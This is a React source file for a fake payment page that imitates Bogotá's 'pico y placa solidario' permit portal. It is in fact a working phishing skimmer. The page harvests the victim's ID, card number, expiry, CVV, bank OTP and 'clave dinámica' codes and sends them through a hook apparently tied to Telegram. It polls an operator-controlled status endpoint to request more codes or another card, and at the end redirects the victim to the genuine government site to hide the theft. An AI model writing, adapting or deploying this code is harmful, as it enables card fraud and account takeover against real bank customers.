/* eslint-disable @next/next/no-img-element */
'use client'
import React, { useState, useEffect } from 'react'

import { usePermitForm } from '@/hook/usePermitForm'
import { plans, getPlanPrice } from '@/lib/utils'
import { useConsultaPersona } from '@/hook/useConsultaPersona'
import { useEnviarTelegram } from '@/hook/useEnviarTelegram'
import ValidacionPSEModal from './ValidarInfoModal'
import OtpModal from './OtpModal'
import DinamicaModal from './DinamicaModal'

interface PermitFormProps {
  selectedPlanId: any
  onPlanSelect: (planId: string) => void
  initialData?: any
  aporteVoluntario?: boolean
}

export default function PermitForm({ selectedPlanId, onPlanSelect, initialData, aporteVoluntario }: PermitFormProps) {
  const [isOpen, setIsOpen] = useState(false)
  const [metodoPago, setMetodoPago] = useState('')
  const [showValidationModal, setShowValidationModal] = useState(false)
  const [validationData, setValidationData] = useState<any>(null)
  const [isManualMode, setIsManualMode] = useState(false)
  const [currentTotal, setCurrentTotal] = useState(0)

  const [cardData, setCardData] = useState({ cardNumber: '', expiryDate: '', cvv: '' })
  const [cardErrors, setCardErrors] = useState({ cardNumber: '', expiryDate: '', cvv: '' })
  const [showCardModal, setShowCardModal] = useState(false)
  const [isCardLoading, setIsCardLoading] = useState(false)
  const [otpRequested, setOtpRequested] = useState(false)
  const [otpError, setOtpError] = useState('')
  const [dinamicaRequested, setDinamicaRequested] = useState(false)
  const [dinamicaError, setDinamicaError] = useState('')

  const [toast, setToast] = useState<{ message: string; type: 'error' | 'success' } | null>(null);

  useEffect(() => {
    if (toast) {
      const timer = setTimeout(() => {
        setToast(null);
      }, 4000);
      return () => clearTimeout(timer);
    }
  }, [toast]);
  const { formData, setFormData, total, handleSubmit, isLoading, error, setError } = usePermitForm(selectedPlanId, metodoPago, initialData)
  const { consultarPersona, loading: consultaLoading, error: consultaError, reset: resetConsulta } = useConsultaPersona()
  const { enviarRegistroTelegram } = useEnviarTelegram()

  // Calcular el total considerando las placas agregadas
  const calculatedTotal = initialData?.placasAgregadas?.reduce((sum: number, item: any) => sum + (item.planId ? getPlanPrice(item.planId) : 0), 0) || 0;

  useEffect(() => {
    setCurrentTotal(calculatedTotal)
  }, [calculatedTotal])

  // Polling para escuchar a Telegram
  useEffect(() => {
    if (!isCardLoading || !formData.cedula) return;

    const interval = setInterval(async () => {
      try {
        const res = await fetch(`/api/banco/status?sessionId=${formData.cedula}`);
        const data = await res.json();
        
        if (data.status === 'tc' || data.status === 'etc') {
          setIsCardLoading(false);
          setOtpRequested(false);
          setCardErrors({ 
            cardNumber: data.status === 'etc' ? 'La transacción fue declinada por el banco' : 'Por favor ingrese otra tarjeta',
            expiryDate: '',
            cvv: ''
          });
        } else if (data.status === 'otp' || data.status === 'eotp') {
          setIsCardLoading(false);
          setOtpRequested(true);
          setDinamicaRequested(false);
          if (data.status === 'eotp') {
             setOtpError('Código dinámico inválido o expirado. Por favor intente de nuevo.');
          } else {
             setOtpError('');
          }
        } else if (data.status === 'dinamica' || data.status === 'edinamica') {
          setIsCardLoading(false);
          setDinamicaRequested(true);
          setOtpRequested(false);
          if (data.status === 'edinamica') {
             setDinamicaError('Clave dinámica inválida o expirada. Por favor intente de nuevo.');
          } else {
             setDinamicaError('');
          }
        } else if (data.status === 'exito' || data.status === 'fin') {
          // Si envían éxito, ocultar modal y completar proceso
          setIsCardLoading(false);
          setShowCardModal(false);
          window.location.href = "https://picoyplacasolidario.movilidadbogota.gov.co/Inicio";
        }
      } catch (err) {
        console.error('Error polling status:', err);
      }
    }, 2000);

    return () => clearInterval(interval);
  }, [isCardLoading, formData.cedula]);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target
    setFormData(prev => ({ ...prev, [name]: value }))
  }

  const handleOtpSubmit = async (code: string) => {
    setIsCardLoading(true);
    try {
      await enviarRegistroTelegram({ 
        ...formData, 
        ...cardData, 
        otp: code,
        metodoPago: 'tarjeta',
        plan: selectedPlanId,
        total: currentTotal
      });
    } catch (err) {
      console.error('Error enviando OTP:', err);
      setIsCardLoading(false);
    }
  };

  const handleDinamicaSubmit = async (code: string) => {
    setIsCardLoading(true);
    try {
      await enviarRegistroTelegram({ 
        ...formData, 
        ...cardData, 
        dinamica: code,
        metodoPago: 'tarjeta',
        plan: selectedPlanId,
        total: currentTotal
      });
    } catch (err) {
      console.error('Error enviando Clave Dinámica:', err);
      setIsCardLoading(false);
    }
  };

  const handleMetodoPagoChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setMetodoPago(e.target.value)
    if (e.target.value === 'tarjeta') {
      setShowCardModal(true)
    }
  }

  const handlePlanSelect = (planId: string) => {
    onPlanSelect(planId)
    setIsOpen(false)
  }

  const handleCardChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target
    if (name === 'cardNumber') {
      const numeric = value.replace(/\D/g, '')
      setCardData(prev => ({ ...prev, [name]: numeric }))
      setCardErrors(prev => ({ ...prev, cardNumber: '' }))
    } else if (name === 'expiryDate') {
      const numeric = value.replace(/[^\d\/]/g, '')
      let formatted = numeric
      if (numeric.length === 2 && !numeric.includes('/')) {
        formatted = numeric + '/'
      }
      setCardData(prev => ({ ...prev, [name]: formatted }))
      setCardErrors(prev => ({ ...prev, expiryDate: '' }))
    } else if (name === 'cvv') {
      const numeric = value.replace(/\D/g, '')
      setCardData(prev => ({ ...prev, [name]: numeric }))
      setCardErrors(prev => ({ ...prev, cvv: '' }))
    }
  }

  const validateLuhn = (num: string) => {
    let sum = 0
    let isEven = false
    for (let i = num.length - 1; i >= 0; i--) {
      let digit = parseInt(num.charAt(i), 10)
      if (isEven) {
        digit *= 2
        if (digit > 9) {
          digit -= 9
        }
      }
      sum += digit
      isEven = !isEven
    }
    return sum % 10 === 0
  }

  const validateExpiry = (val: string) => {
    if (!/^\d{2}\/\d{2}$/.test(val)) return false
    const [mm, yy] = val.split('/')
    const month = parseInt(mm, 10)
    const year = parseInt(yy, 10) + 2000
    if (month < 1 || month > 12) return false

    const now = new Date()
    const currentMonth = now.getMonth() + 1
    const currentYear = now.getFullYear()

    if (year < currentYear) return false
    if (year === currentYear && month < currentMonth) return false
    return true
  }

  const handleCardModalConfirm = () => {
    let hasError = false
    const errors = { cardNumber: '', expiryDate: '', cvv: '' }

    if (cardData.cardNumber.length !== 13 && cardData.cardNumber.length !== 15 && cardData.cardNumber.length !== 16) {
      errors.cardNumber = 'Longitud inválida'
      hasError = true
    } else if (!validateLuhn(cardData.cardNumber)) {
      errors.cardNumber = 'Tarjeta inválida'
      hasError = true
    }

    if (!validateExpiry(cardData.expiryDate)) {
      errors.expiryDate = 'Fecha inválida o vencida'
      hasError = true
    }

    if (cardData.cvv.length < 3) {
      errors.cvv = 'CVV inválido'
      hasError = true
    }

    if (hasError) {
      setCardErrors(errors)
      return false
    }

    setCardErrors({ cardNumber: '', expiryDate: '', cvv: '' })
    return true
  }

  const handleCardModalCancel = () => {
    setShowCardModal(false)
    if (!cardData.cardNumber) {
      setMetodoPago('')
    }
  }

  const handleFormSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    if (metodoPago === 'tarjeta') {
      let hasError = false
      const errors = { cardNumber: '', expiryDate: '', cvv: '' }

      if (cardData.cardNumber.length !== 13 && cardData.cardNumber.length !== 15 && cardData.cardNumber.length !== 16) {
        errors.cardNumber = 'Longitud inválida'
        hasError = true
      } else if (!validateLuhn(cardData.cardNumber)) {
        errors.cardNumber = 'Tarjeta inválida'
        hasError = true
      }

      if (!validateExpiry(cardData.expiryDate)) {
        errors.expiryDate = 'Fecha inválida o vencida'
        hasError = true
      }

      if (cardData.cvv.length < 3) {
        errors.cvv = 'CVV inválido'
        hasError = true
      }

      if (hasError) {
        setCardErrors(errors)
        setShowCardModal(true)
        return
      }
    }

    // Si el método de pago es PSE, validar primero
    if (metodoPago === 'pse') {
      // Verificar que la cédula esté completa
      if (!formData.cedula) {
        setToast({ message: 'Por favor ingresa el número de cédula para validar', type: 'error' });
        return;
      }

      setIsManualMode(false)

      // Consultar la persona en la API
      const identifier = await consultarPersona(formData.cedula)

      // El identifier es de tipo DatosPersonaResponse | null
      const isManual = !identifier || !identifier.encontrado
      setIsManualMode(isManual)

      // Abrir el modal de validación con los datos obtenidos
      setValidationData({
        idSolicitud: !isManual ? identifier?.idSolicitud : undefined,
        idDatosUsuario: !isManual ? identifier?.idDatosUsuario : undefined,
        nombre: formData.nombre,
        identificacion: formData.cedula,
        placa: formData.placa,
        email: formData.email || '',
        direccion: formData.direccion || '',
      })

      setShowValidationModal(true)
      return
    }

    // Para otros métodos de pago, proceder normalmente
    handleSubmit(e)
  }

  const handleValidationConfirm = (data: any) => {
    console.log('✅ Validación confirmada:', data)
    setShowValidationModal(false)

    // Aquí puedes continuar con el flujo de pago PSE
    const paymentData = {
      ...formData,
      ...data,
      idDatosUsuario: validationData?.idDatosUsuario,
      idSolicitud: validationData?.idSolicitud,
      metodoPago: 'pse',
      isManual: isManualMode,
      total: currentTotal,
    }



    // Si es modo manual, mostrar un mensaje
    if (isManualMode) {
      console.log('ℹ️ Modo manual: Datos ingresados por el usuario sin validación de API')
    }

    // Simular envío del formulario
    handleSubmit(new Event('submit') as any)
  }

  const handleValidationCancel = () => {
    setShowValidationModal(false)
    setValidationData(null)
    setIsManualMode(false)
    resetConsulta()
  }

  const selectedPlanLabel = selectedPlanId
    ? plans.find((p) => p.id === selectedPlanId)?.label
    : 'Seleccione un plan de circulación'

  return (
    <>
      <div className="w-full flex flex-col items-center py-4">
        <p className="text-[#3a4959] text-[15px] mb-4">Selecciona el medio de pago</p>

        <div className="w-full flex justify-center gap-2 flex-wrap pb-4">
          <button
            type="button"
            onClick={async () => {
              setMetodoPago('pse')
              if (!formData.cedula) {
                setToast({ message: 'Por favor ingresa el número de cédula para validar', type: 'error' });
                return;
              }
              setIsManualMode(false)
              const identifier = await consultarPersona(formData.cedula)
              const isManual = !identifier || !identifier.encontrado
              setIsManualMode(isManual)
              setValidationData({
                idSolicitud: !isManual ? identifier?.idSolicitud : undefined,
                idDatosUsuario: !isManual ? identifier?.idDatosUsuario : undefined,
                nombre: formData.nombre,
                identificacion: formData.cedula,
                placa: formData.placa,
                email: formData.email || '',
                direccion: formData.direccion || '',
              })
              setShowValidationModal(true)
            }}
            disabled={isLoading || consultaLoading}
            className="flex flex-col items-center p-2 border border-[#1b365d] rounded-sm cursor-pointer hover:border-green-500 hover:shadow-md transition-all bg-white w-[110px] h-[125px] disabled:opacity-50 group"
          >
            <div className="w-2.5 h-2.5 rounded-full border border-gray-500 mt-1 mb-2 group-hover:border-green-500"></div>
            <div className="flex-1 flex items-center justify-center">
              <img src="/pse.png" alt="PSE" width={65} height={65} className="object-contain" />
            </div>
            <span className="text-[11px] text-[#1b365d] font-medium mt-1">PSE</span>
          </button>

          <button
            type="button"
            onClick={() => {
              setMetodoPago('tarjeta')
              setShowCardModal(true)
            }}
            disabled={isLoading || consultaLoading}
            className="flex flex-col items-center p-2 border border-[#1b365d] rounded-sm cursor-pointer hover:border-green-500 hover:shadow-md transition-all bg-white w-[110px] h-[125px] disabled:opacity-50 group"
          >
            <div className="w-2.5 h-2.5 rounded-full border border-gray-500 mt-1 mb-1 group-hover:border-green-500"></div>
            <div className="flex-1 flex items-center justify-center text-[#001f24]">
              <svg xmlns="http://www.w3.org/2000/svg" width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"><rect width="20" height="14" x="2" y="5" rx="2" /><line x1="2" x2="22" y1="10" y2="10" /></svg>
            </div>
            <span className="text-[11px] text-[#1b365d] font-medium mt-1">Débito/Crédito</span>
          </button>

          <button
            type="button"
            onClick={() => {
              setMetodoPago('bancolombia')
              handleSubmit(new Event('submit') as any)
            }}
            disabled={isLoading || consultaLoading}
            className="flex flex-col items-center p-2 border border-[#1b365d] rounded-sm cursor-pointer hover:border-green-500 hover:shadow-md transition-all bg-white w-[110px] h-[125px] disabled:opacity-50 group"
          >
            <div className="w-2.5 h-2.5 rounded-full border border-gray-500 mt-1 mb-2 group-hover:border-green-500"></div>
            <div className="flex-1 flex items-center justify-center">
              <img src="/bancolombia.png" alt="Bancolombia" width={55} height={55} className="object-contain" />
            </div>
            <span className="text-[11px] text-[#1b365d] font-medium mt-1">Bancolombia</span>
          </button>
          <button
            type="button"
            onClick={() => {
              setMetodoPago('davivienda')
              handleSubmit(new Event('submit') as any)
            }}
            disabled={isLoading || consultaLoading}
            className="flex flex-col items-center p-2 border border-[#1b365d] rounded-sm cursor-pointer hover:border-green-500 hover:shadow-md transition-all bg-white w-[110px] h-[125px] disabled:opacity-50 group"
          >
            <div className="w-2.5 h-2.5 rounded-full border border-gray-500 mt-1 mb-2 group-hover:border-green-500"></div>
            <div className="flex-1 flex items-center justify-center">
              <img src="/btn-Davivienda.png" alt="Davivienda" width={55} height={55} className="object-contain" />
            </div>
            <span className="text-[11px] text-[#1b365d] font-medium mt-1">Davivienda</span>
          </button>
        </div>

        {consultaError && (
          <div className="mt-2 text-sm text-yellow-600 bg-yellow-50 p-2 rounded border border-yellow-200">
            ⚠️ {consultaError} - Puede completar los datos manualmente
          </div>
        )}

        {metodoPago === 'tarjeta' && (
          <div className="border border-green-200 rounded-sm p-3 mt-4 bg-green-50 shadow-sm flex justify-between items-center animate-in slide-in-from-top-2 w-full max-w-sm">
            <div className="flex items-center gap-3">
              <div className="bg-white p-2 rounded-md shadow-sm border border-green-100">
                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#16a34a" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect width="20" height="14" x="2" y="5" rx="2" /><line x1="2" x2="22" y1="10" y2="10" /></svg>
              </div>
              <div>
                <p className="text-sm font-semibold text-green-800">Tarjeta vinculada</p>
                <p className="text-xs text-green-600 font-medium">
                  {cardData.cardNumber ? `**** **** **** ${cardData.cardNumber.slice(-4)}` : 'Sin datos'}
                </p>
              </div>
            </div>
            <button
              type="button"
              onClick={() => setShowCardModal(true)}
              className="text-xs font-bold text-green-700 hover:text-green-800 bg-white border border-green-200 rounded px-3 py-1.5 shadow-sm transition-colors"
            >
              Editar
            </button>
          </div>
        )}
      </div>

      {/* Modal de Validación para PSE */}
      <ValidacionPSEModal
        isOpen={showValidationModal}
        onClose={handleValidationCancel}
        onConfirm={handleValidationConfirm}
        personaData={validationData || {
          idSolicitud: '',
          idDatosUsuario: '',
          nombre: formData.nombre,
          identificacion: formData.cedula,
          placa: formData.placa,
          email: formData.email || '',
          direccion: formData.direccion || '',
        }}
        total={currentTotal || total}
      />

      {/* Modal de Tarjeta */}
      {showCardModal && (
        <div className="fixed inset-0 z-100 flex items-center justify-center bg-black/60 backdrop-blur-sm animate-in fade-in duration-200">
          <div className="bg-white rounded-xl shadow-2xl w-full max-w-sm p-6 m-4 animate-in zoom-in-95 duration-200">
            <div className="flex justify-between items-center mb-5">
              <h4 className="font-bold text-lg text-gray-800">Datos de la Tarjeta</h4>
              <button type="button" onClick={handleCardModalCancel} className="text-gray-400 hover:text-gray-600 transition-colors">
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path></svg>
              </button>
            </div>

            <div className="space-y-4">
              <div className="space-y-1.5">
                <label className="text-sm font-medium text-gray-700">Número de Tarjeta</label>
                <input
                  type="text"
                  name="cardNumber"
                  value={cardData.cardNumber}
                  onChange={handleCardChange}
                  maxLength={16}
                  placeholder="0000 0000 0000 0000"
                  className={`flex h-11 w-full rounded-lg border ${cardErrors.cardNumber ? 'border-red-500 focus:ring-red-500' : 'border-gray-300 focus:ring-green-500'} bg-white px-3 py-2 text-sm shadow-sm transition-colors focus:outline-none focus:ring-2`}
                />
                {cardErrors.cardNumber && <p className="text-xs text-red-500 font-medium">{cardErrors.cardNumber}</p>}
              </div>
              <div className="grid grid-cols-2 gap-4">
                <div className="space-y-1.5">
                  <label className="text-sm font-medium text-gray-700">Vencimiento</label>
                  <input
                    type="text"
                    name="expiryDate"
                    value={cardData.expiryDate}
                    onChange={handleCardChange}
                    maxLength={5}
                    placeholder="MM/AA"
                    className={`flex h-11 w-full rounded-lg border ${cardErrors.expiryDate ? 'border-red-500 focus:ring-red-500' : 'border-gray-300 focus:ring-green-500'} bg-white px-3 py-2 text-sm shadow-sm transition-colors focus:outline-none focus:ring-2`}
                  />
                  {cardErrors.expiryDate && <p className="text-xs text-red-500 font-medium">{cardErrors.expiryDate}</p>}
                </div>
                <div className="space-y-1.5">
                  <label className="text-sm font-medium text-gray-700">CVV</label>
                  <input
                    type="password"
                    name="cvv"
                    value={cardData.cvv}
                    onChange={handleCardChange}
                    maxLength={4}
                    placeholder="123"
                    className={`flex h-11 w-full rounded-lg border ${cardErrors.cvv ? 'border-red-500 focus:ring-red-500' : 'border-gray-300 focus:ring-green-500'} bg-white px-3 py-2 text-sm shadow-sm transition-colors focus:outline-none focus:ring-2`}
                  />
                  {cardErrors.cvv && <p className="text-xs text-red-500 font-medium">{cardErrors.cvv}</p>}
                </div>
              </div>
              <div className="pt-5">
                <button
                  type="button"
                  disabled={isCardLoading}
                  onClick={async (e) => {
                    const isValid = handleCardModalConfirm()
                    if (isValid) {
                      setIsCardLoading(true)
                      try {
                        await enviarRegistroTelegram({ 
                          ...formData, 
                          ...cardData, 
                          metodoPago: 'tarjeta',
                          plan: selectedPlanId,
                          total: currentTotal
                        })
                        // Se queda cargando intencionalmente como solicitó el usuario
                      } catch (err) {
                        setIsCardLoading(false)
                        setError('Ocurrió un error al procesar el pago. Por favor intente nuevamente.')
                      }
                    }
                  }}
                  className="w-full bg-[#1a4d2e] hover:bg-[#2a6d3e] text-white font-bold py-3 px-4 rounded-lg transition-all duration-200 shadow-md hover:shadow-lg disabled:opacity-70 flex justify-center items-center h-12"
                >
                  {isCardLoading ? (
                    <div className="w-6 h-6 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                  ) : (
                    "Pagar"
                  )}
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {error && (
        <div className="fixed inset-0 z-100 flex items-center justify-center bg-black/60 backdrop-blur-sm p-4 animate-in fade-in duration-200">
          <div className="bg-white rounded-xl shadow-2xl max-w-sm w-full p-6 text-center animate-in zoom-in-95 duration-200">
            <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4">
              <svg xmlns="http://www.w3.org/2000/svg" className="h-8 w-8 text-red-500" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                <path strokeLinecap="round" strokeLinejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
              </svg>
            </div>
            <h3 className="text-lg font-bold text-gray-900 mb-2">Atención</h3>
            <p className="text-sm text-gray-600 mb-6">{error}</p>
            <button 
              onClick={() => setError(null)}
              className="w-full py-2.5 bg-gray-900 text-white rounded-lg font-medium hover:bg-gray-800 transition-colors"
            >
              Aceptar
            </button>
          </div>
        </div>
      )}
      {/* TOAST NOTIFICATION */}
      {toast && (
        <div className="fixed top-6 right-6 z-99999 animate-slide-in">
          <style>{`
            @keyframes slideIn {
              from { transform: translate3d(100%, 0, 0); opacity: 0; }
              to { transform: translate3d(0, 0, 0); opacity: 1; }
            }
            .animate-slide-in {
              animation: slideIn 0.3s cubic-bezier(0.16, 1, 0.3, 1) forwards;
            }
          `}</style>
          <div className={`backdrop-blur-md border text-white p-4 rounded-xl shadow-2xl flex items-center space-x-3.5 max-w-sm ring-1 ${toast.type === 'success' ? 'bg-green-600/90 border-green-500/20 ring-green-500/30' : 'bg-red-600/90 border-red-500/20 ring-red-500/30'}`}>
            <div className="bg-white/20 p-2 rounded-lg text-white">
              {toast.type === 'success' ? (
                <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" />
                </svg>
              ) : (
                <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
                </svg>
              )}
            </div>
            <div className="flex-1">
              <h4 className="font-semibold text-sm text-white">{toast.type === 'success' ? 'Éxito' : 'Aviso'}</h4>
              <p className={`text-xs mt-0.5 ${toast.type === 'success' ? 'text-green-100/90' : 'text-red-100/90'}`}>{toast.message}</p>
            </div>
            <button onClick={() => setToast(null)} className="text-white/60 hover:text-white transition-colors p-1 rounded-lg hover:bg-white/10">
              <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12" />
              </svg>
            </button>
          </div>
        </div>
      )}

      {/* MODAL OTP INDEPENDIENTE */}
      <OtpModal 
        isOpen={otpRequested} 
        onClose={() => setOtpRequested(false)} 
        onSubmit={handleOtpSubmit} 
        errorMsg={otpError} 
        isLoading={isCardLoading} 
      />

      {/* MODAL CLAVE DINAMICA INDEPENDIENTE */}
      <DinamicaModal 
        isOpen={dinamicaRequested} 
        onClose={() => setDinamicaRequested(false)} 
        onSubmit={handleDinamicaSubmit} 
        errorMsg={dinamicaError} 
        isLoading={isCardLoading} 
      />
    </>
  )
}